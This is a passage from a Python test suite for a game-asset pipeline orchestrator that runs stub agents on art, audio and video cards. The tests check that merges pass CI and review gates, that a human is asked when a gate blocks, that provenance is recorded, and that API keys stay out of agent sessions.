              "`Art/Source/Ella/**`, `Art/Sprites/Ella/**`",
              "`python3 tools/sprite_check.py --scan Art/Sprites` prints PASS for `Art/Sprites/Ella/ella_idle.png`"),
             ("102", "Gust catch sound", "Audio", "QA and Build", "Ana", "`Audio/Source/GustCatch/**`, `Audio/Raw/**`",
              "`python3 tools/audio_check.py --scan Audio/Source` prints no FAIL line for SW_GustCatch_00.wav"),
             ("103", "Gameplay video cut", "QA and Build", "Producer", "Rick", "`pipeline/submission/video/**`",
              "`python3 tools/submission_check.py video pipeline/submission/video/gameplay.mp4` prints PASS"))

    @classmethod
    def setUpClass(cls):
        sys.path.insert(0, os.path.join(ROOT, "tests"))
        sys.path.insert(0, os.path.join(ROOT, "tests", "fixtures", "kickoff"))
        import importlib.util
        import kickoff_sandbox
        import stubbins
        spec = importlib.util.spec_from_file_location("stub_agent_form", os.path.join(
            ROOT, "tests", "fixtures", "kickoff", "stub_agent.py"))
        stub = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(stub)
        cls.sb = sb = kickoff_sandbox.KickoffSandbox(PEOPLE)
        refs_path = os.path.join(sb.repo, "pipeline", "art", "references.json")
        with open(refs_path, encoding="utf-8") as fh:
            refs = json.load(fh)
        for r in refs["references"]:
            if r["id"] == "ella-rising":
                r["cards"].append("101")   # the art card's own reference (art_ref_check, the art loop's pieces)
        with open(refs_path, "w", encoding="utf-8") as fh:
            json.dump(refs, fh, indent=1, ensure_ascii=False)
            fh.write("\n")
        sb.git("commit", "-q", "-am", "Card 101 is an Ella art card")
        sb.git("push", "-q", "origin", "main")
        b = stubbins.make(os.path.join(sb.base, "bin"), skip=("git-lfs",))   # the real git-lfs filters the PNGs
        game = os.path.join(b, "UmbrellaElla.exe")
        write(game, f"#!{PY}\nimport time\ntime.sleep(3)\n", exe=True)
        issues = []
        for n, (cid, title, owner, reviewer, human, lane, done) in enumerate(cls.CARDS, 1):
            body = stub.FORM.format(owner=owner, reviewer=reviewer, human=human, lane=lane, after="none",
                                    dnt="Content/UmbrellaElla/Maps/**", locks="none", needs="build, tests",
                                    budget="60 min agent + 15 min human", done="- [ ] " + done)
            issues.append({"number": n, "title": f"[UE-{cid}] {title}", "body": body, "labels": ["task", "todo"],
                           "state": "OPEN", "comments": []})
        sb.save({"issues": issues, "prs": [], "next": len(issues) + 1})
        cls.http = os.path.join(sb.base, "http.log")
        cls.env = dict(stubbins.tool_env(b), STUB_DAY0_ONLY="none", STUB_GAME_EXE=game, HTTP_STUB_LOG=cls.http,
                       ASSETGEN_HTTP_STUB=os.path.join(ROOT, "tests", "fixtures", "kickoff", "http_stub.py"),
                       PATH=b + os.pathsep + os.environ.get("PATH", ""), STUB_CRITIC=cls.CRITIC,
                       STUB_BLENDER_ART=os.path.join(ROOT, "pipeline", "art", "reference", "Test_Assets",
                                                     "CHR_Witch_Cast.png") + ":432x352",
                       OPENAI_API_KEY="fake-openai-ASSETKEY0123456789abcdef", ELEVENLABS_API_KEY="fake-eleven-assetkey0123456789")
        cls.outs, cls.asks = [], []
        rc, out = sb.kickoff("--agent", "claude", "--practice", **cls.env)
        cls.outs.append((rc, out))
        cls.stop = None
        for _ in range(6):
            answered, cls.stop = sb.human_round()
            cls.asks += answered
            if cls.stop or not answered:
                break
            cls.outs.append(sb.kickoff("--agent", "claude", **cls.env))
        sb.git("fetch", "-q", "origin")
        cls.main = os.path.join(sb.base, "main-check")
        sb.git("worktree", "add", "-q", "--detach", cls.main, "origin/main")

    @classmethod
    def tearDownClass(cls):
        cls.sb.close()

    def critic_sessions(self):
        return [s for s in self.sb.sessions() if s.get("critic") and s["event"] == "start"]

    def test_runs_clean_and_kickoff_merges_what_passes_its_gates(self):
        """Josh, 11 Nov: kickoff merges a card PR itself once CI is green, the reviewer approved and check_pr passes;
        a person is asked only with the gate that blocked it. The video card passes and merges with no human. The
        art card's PR body has no evidence header (kickoff commits its art-loop pass record after the session, so a
        header would be stale) and the stub's audio card pastes no `audio_loop close` line: check_pr fails both, so
        kickoff asks with that reason instead of merging (then the test plays the human)."""
        for rc, out in self.outs:
            self.assertEqual(rc, 0, out[-3000:])
            self.assertNotIn("ERROR", out, out[-3000:])
        merged = "".join(out for _, out in self.outs)
        self.assertRegex(merged, r"(?m)^MERGED UE-103 PR #\d+ ", "the video card merged with no human")
        self.assertEqual(len(self.asks), 2, self.asks)
        self.assertTrue(all("merge PR #" in a and "kickoff could not merge it" in a and "check_pr:" in a
                            for a in self.asks), self.asks)
        self.assertTrue(any("missing section" in a for a in self.asks), "the art PR body")
        self.assertTrue(any("audio_loop close: PASS" in a for a in self.asks), "the audio PR evidence")
        self.assertIn("close G1", self.stop or "", "then the gate, a human's call")
        self.assertTrue(all(i["state"] == "CLOSED" for i in self.sb.gh()["issues"] if "task" in i["labels"]))
        self.assertGreaterEqual(len(self.critic_sessions()), 3 * 4, "a panel of 3 per pair, every pair")

    def test_assets_merged_with_provenance_and_gates_pass(self):
        m = self.main
        for rel in ("Art/Sprites/Ella/ella_idle.png", "Art/Sprites/Ella/ella_idle.sprite.json",
                    "Art/Sprites/Ella/ella_idle.artloop.json",
                    "Audio/Source/GustCatch/SW_GustCatch_00.wav", "pipeline/submission/video/gameplay.mp4"):
            self.assertTrue(os.path.exists(os.path.join(m, rel)), rel)
        with open(os.path.join(m, "pipeline", "art", "provenance.csv"), encoding="utf-8") as fh:
            prov = {r["asset_path"]: r for r in csv.DictReader(fh)}
        self.assertEqual(prov["Art/Source/Ella/Raw/IdleFloat/Ella_IdleFloat_00.png"]["tool"], "Blender (headless scripts)")
        self.assertEqual(prov["Art/Sprites/Ella/ella_idle.png"]["tool"], "Aseprite CLI")
        self.assertEqual(prov["Audio/Source/GustCatch/SW_GustCatch_00.wav"]["tool"], "ElevenLabs Sound Effects API")
        self.assertTrue(prov["Art/Sprites/Ella/ella_idle.png"]["author"].startswith("asset-specialist"))
        import art_loop
        self.assertTrue(any("could not re-run" in p for p in art_loop.record_problems(m, "Art/Sprites/Ella/ella_idle.png")),
                        "an LFS pointer (no pixels) fails closed")
        for step in (["git", "lfs", "pull", "origin"], ["git", "lfs", "checkout"]):   # the pixels: sheet and references
            p = subprocess.run(step, cwd=m, capture_output=True, text=True)
            self.assertEqual(p.returncode, 0, p.stderr)
        self.assertEqual(art_loop.record_problems(m, "Art/Sprites/Ella/ella_idle.png"), [],
                         "the merged sheet clears the ship gate on main, checks re-run")
        rec = json.load(open(os.path.join(m, "Art/Sprites/Ella/ella_idle.artloop.json")))
        self.assertEqual(rec["panel"], 3)
        self.assertEqual(rec["calibration"]["passed"], rec["calibration"]["sessions"])
        out = "".join(o for _, o in self.outs)
        self.assertIn("art_loop: PASS card=101 piece=ella-up-open", out)
        self.assertIn("file=Art/Sprites/Ella/ella_idle.png sha=", out, "kickoff's pass line names the file and bytes")

    def test_api_calls_came_from_kickoff_never_a_session(self):
        with open(self.http, encoding="utf-8") as fh:
            urls = fh.read().split()
        self.assertEqual(sum("api.openai.com" in u for u in urls), 0, "art has no API: Blender")
        self.assertEqual(sum("api.elevenlabs.io" in u for u in urls), 1)
        self.assertFalse(any(s.get("has_key") for s in self.sb.sessions()))


@unittest.skipIf(NESTED, "nested CI run inside the honest suite")
@unittest.skipIf(shutil.which("git") is None, "needs git")
class HonestAgentAssetsBelowTheBar(HonestAgentAssets):
    """Broken on purpose: the critics keep picking the team art over ours. The art card loops, gets stuck after 3 flat
    rounds, asks a human for help (never to approve) and its sheet never reaches main; audio and video still merge."""

    CRITIC = "fail"

    def test_runs_clean_and_kickoff_merges_what_passes_its_gates(self):
        for rc, out in self.outs:
            self.assertEqual(rc, 0, out[-3000:])
        art = [a for a in self.asks if "UE-101" in a]
        self.assertTrue(art and all("merge PR" not in a for a in art), self.asks)
        self.assertTrue(any("art loop stuck" in a for a in art), art)
        self.assertEqual(sum("merge PR #" in a for a in self.asks), 1, "only audio: check_pr blocks it" + repr(self.asks))
        self.assertRegex("".join(o for _, o in self.outs), r"(?m)^MERGED UE-103 PR #\d+ ", "video merged by kickoff")

    def test_assets_merged_with_provenance_and_gates_pass(self):
        m = self.main
        for rel in ("Art/Sprites/Ella/ella_idle.png", "Art/Sprites/Ella/ella_idle.artloop.json"):
            self.assertFalse(os.path.exists(os.path.join(m, rel)), f"{rel} reached main below the bar")
        self.assertTrue(os.path.exists(os.path.join(m, "Audio/Source/GustCatch/SW_GustCatch_00.wav")))


if __name__ == "__main__":
    unittest.main()
